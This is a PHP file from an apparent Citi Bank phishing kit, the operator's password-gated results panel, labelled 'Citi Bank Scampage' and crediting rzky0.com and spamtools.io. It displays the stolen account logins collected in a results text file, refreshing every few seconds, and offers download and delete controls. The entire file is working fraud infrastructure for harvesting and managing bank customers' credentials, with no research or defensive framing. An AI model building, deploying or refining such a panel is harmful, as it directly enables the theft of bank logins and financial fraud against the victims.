<?php
error_reporting(0);
@ini_set('display_errors', 0);
include '../email.php';
?>
<?php
session_start();
$auth_paass= md5($adminpanelpassword); //rzky0.com
function login(){
  die('<!DOCTYPE html>
<html>
    <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <title>Citi Bank</title>
        
        <meta http-equiv="refresh" content="">
        <meta name="description" content="Sites description">
        <meta name="about" content="">
            
    <meta name="description" content="" />
    <meta name=\"location\" content=\"\" />
    <meta http-equiv=\"refres\" content=\"1800\">
    <meta name=\"working\" content=\"rzky0.com\" />
    <meta name=\"about\" content=\"spamtools.io\" />
        <meta name=\"author\" content=\"Salman Arif Khan\" />
        <meta name=\"keywords\" content=\"\" />
    <meta name=\"revisit-after\" content=\1800\" />
    <meta name=\"languag\" content=\"en\" />
    <meta content=\'general\' name=\'rating\' />
    <meta content=\'google\' name=\'generator\' />
    <meta content=\'follow,all\' name=\'msnbot\' />
    <meta content=\'follow,all\' name=\'alexabot\' />
    <meta content=\'pakistan\' name=\'geo.placename\' />
    <meta content=\"index,follow,all\" name=\"googlebot\" />
    <meta http-equiv=\"X-UA-Compatible\" content=\"IE-edge\" />
    <link rel=\"SHORTCUT ICON\" href=\"https://scontent.fisb3-1.fna.fbcdn.net/v/t31.0-8/26114364_282922625564401_5726606951952680138_o.png?_nc_cat=0&_nc_eui2=AeGexq8pdb-rOQQnrfw8JqATyRVcjYSc8O6NOPMv3P27boKX9PPKyDG7eCXEBDEugMVoYfsZ0djtBVwoFMA7WTUK6OgIfsSlV4U3MDEtWzPgUUyqYQrZ7gqtDn_EfKy6nV0&oh=45d478e8fd979afdd0df196e924c48c4&oe=5B8A3DEB\" />
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
    <meta name=\'search engines\' content=\'Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot\' />
      
        <meta name=\"description\" content=\"Citi Bank\">
        <style>
body{

background-image: url(https://images.sftcdn.net/images/t_optimized,f_auto/p/f7751068-96d2-11e6-9f6b-00163ec9f5fa/1554209287/hacker-simulator-screenshot.jpg);
                background-color: #080510;
                 background-size:cover;
}
 body{cursor: url(""), auto;}
input{
text-shadow: #777777 0px 0px 3px;
border: 1px solid #007700;
box-shadow: 0px 0px 4px #007700;
color: #009900;
text-align:center;
border-top:1px solid #007700;
border-left:1px solid #007700;
border-bottom:1px solid #007700;
border-right:1px solid #007700;
background:transparent;

}
input:hover{
transition-duration:0.5s;
-o-transition-duration:0.5s;
-moz-transition-duration:0.5s;
-webkit-transition-duration:0.5s;
border-style:dashed;

}
#forbid{
    display:none;
}
table{
    margin-top:25px;
}
</style>
        <script language="JavaScript1.2">
            function ejs_nodroit(){
                alert("Login Please!");
                return(false);
            }
            document.oncontextmenu = ejs_nodroit;
        </script>
    </head>

    <body class="body">

    <center>
            <form method="post">
            <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<table title="spamtools.io">
<tr><td colspan=2><h1 style="color:red;text-shadow:2px 3px 5px #fff;"><center><font color="green" />[=> Citi Bank LOGIN</font><font color="white" /><=]</font></h1><br><font color=white> <center><font color="red" /></font></font></td></tr>
<tr><td><font color=#007700 size=5 face=courier new> Username :</font></td><td>
<input type="text" value="Hacker" disabled></td></tr>
<tr><td><font color=#007700 size=5 face=courier new>Password :</font></td><td>
<input type="password" name="pass" ></td></tr>
<tr><td colspan=2><input type="submit" value="login!" style="width:100%;color:white;"></td></tr>
</table>

        </div>
    </body>
</html>');
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_paass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_paass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        login();
?>

<?php
$page = $_SERVER['PHP_SELF'];
$sec = "4";
$file = '../results/login.txt';
$orig = file_get_contents($file);
$a = htmlentities($orig);

?>

<!DOCTYPE html>
<html>
<head>
  <title>Citi Bank Login</title>
      <meta http-equiv="refresh" content="<?php echo $sec;?>;URL='<?php echo $page;?>'">

<style type="text/css">
  body{
    background-color: black;
    background-image: url(images/bg.jpg);
    background-size: cover;
  }
  .buttonstyle 
{ 
background: black; 
background-position: 0px -401px; 
border: solid 1px #000000; 
color: #ffffff;
height: 21px;
margin-top: -1px;
padding-bottom: 2px;
}
.buttonstyle:hover {background: white;background-position: 0px -501px;color: #000000; }
  table {
  border: 1px solid #ccc;
  border-collapse: collapse;
  margin: 0;
  padding: 0;
  width: 100%;
  table-layout: fixed;
}

table caption {
  font-size: 1.5em;
  margin: .5em 0 .75em;
}

table tr {
  background-color: #00000;
  border: 1px solid #ddd;
  padding: .35em;
}

table th,
table td {
  padding: .625em;
  text-align: center;
}

table th {
  font-size: .85em;
  letter-spacing: .1em;
  text-transform: uppercase;
}

@media screen and (max-width: 600px) {
  table {
    border: 0;
  }

  table caption {
    font-size: 1.3em;
  }
  
  table thead {
    border: none;
    clip: rect(0 0 0 0);
    height: 1px;
    margin: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
  }
  
  table tr {
    border-bottom: 3px solid #ddd;
    display: block;
    margin-bottom: .625em;
  }
  
  table td {
    border-bottom: 1px solid #ddd;
    display: block;
    font-size: .8em;
    text-align: right;
  }
  
  table td::before {
    /*
    * aria-label has no advantage, it won't be read inside a table
    content: attr(aria-label);
    */
    content: attr(data-label);
    float: left;
    font-weight: bold;
    text-transform: uppercase;
  }
  
  table td:last-child {
    border-bottom: 0;
  }
}
</style>

</head><center>
<body><font color="white"> 
<pre>
  

 ██████╗██╗████████╗██╗    ██████╗  █████╗ ███╗   ██╗██╗  ██╗
██╔════╝██║╚══██╔══╝██║    ██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝
██║     ██║   ██║   ██║    ██████╔╝███████║██╔██╗ ██║█████╔╝ 
██║     ██║   ██║   ██║    ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗ 
╚██████╗██║   ██║   ██║    ██████╔╝██║  ██║██║ ╚████║██║  ██╗
 ╚═════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
                                                             


</pre></center>
</font>
<table><center>
  <caption>Citi Bank Scampage</caption>
  <form method="post" action="">
    <input type="submit" name="deleteall" value="Delete Results" class="buttonstyle"><br>
    <a href="../results/login.txt" class="buttonstyle" download=""><?php if (file_exists("../results/login.txt")) {
      echo "Download Results";
    }else{
      print("</a><font color=white>Results File Not available</script>");
    } ?></a>
  </form></center>
  <thead>
    <tr bgcolor="#00bfff">
      <th bgcolor="#ff0000" scope="col">Account Information</th>

    </tr>
  </thead>
  <tbody>
    <tr bgcolor="#00bfff">
      <td data-label="Account Login" bgcolor="#000033"><code><pre><font color="white"><?php echo $a;  ?></pre></code></td>
    </tr>
    <tr>
      <td scope="row" data-label=""></td>
</tr>
</body>
</html>
<?php
if (isset($_POST['deleteall'])) {
  $file = "../results/login.txt";  
   
// Use unlink() function to delete a file  
if (!unlink($file)) {  
    echo ("<br><font color=\"white\" >$file cannot be deleted due to an error</br>");  
}  
else {  
    echo ("<br><font color=\"white\" >$file has been deleted</br>");  
}
}

?>